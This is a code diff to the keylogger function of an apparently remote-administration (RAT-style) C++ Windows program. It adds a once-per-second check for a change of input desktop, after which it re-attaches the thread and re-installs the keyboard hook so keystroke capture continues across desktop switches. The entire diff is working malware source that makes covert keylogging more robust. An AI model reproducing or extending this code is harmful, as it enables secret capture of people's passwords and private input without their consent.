@@ -545,6 +545,8 @@ DWORD WINAPI CKeyboardManager1::KeyLogger(LPVOID lparam)
     TCHAR WindowCaption[CAPTION_SIZE] = {};
     HWND PreviousFocus = NULL;
     GET_PROCESS(DLLS[USER32], GetAsyncKeyState);
+    HDESK desktop = NULL;
+    clock_t lastCheck = 0;
     while(pThis->m_bIsWorking) {
         if (!pThis->IsConnected() && !pThis->m_bIsOfflineRecord) {
 #if USING_KB_HOOK
@@ -555,6 +557,22 @@ DWORD WINAPI CKeyboardManager1::KeyLogger(LPVOID lparam)
         }
         Sleep(5);
 #if USING_KB_HOOK
+        clock_t now = clock();
+        if (now - lastCheck > 1000) {
+            lastCheck = now;
+			HDESK hInputDesk = IsDesktopChanged(desktop, DESKTOP_READOBJECTS | 
+                DESKTOP_WRITEOBJECTS | DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD);
+			if (hInputDesk) {
+				ReleaseHook();
+				if (desktop) {
+					CloseDesktop(desktop);
+				}
+				desktop = hInputDesk;
+				if (!SetThreadDesktop(desktop)) {
+					Mprintf("SetThreadDesktop failed: %d\n", GetLastError());
+				}
+			}
+        }
         if (!SetHook(WriteBuffer, pThis->m_Buffer)) {
             return -1;
         }
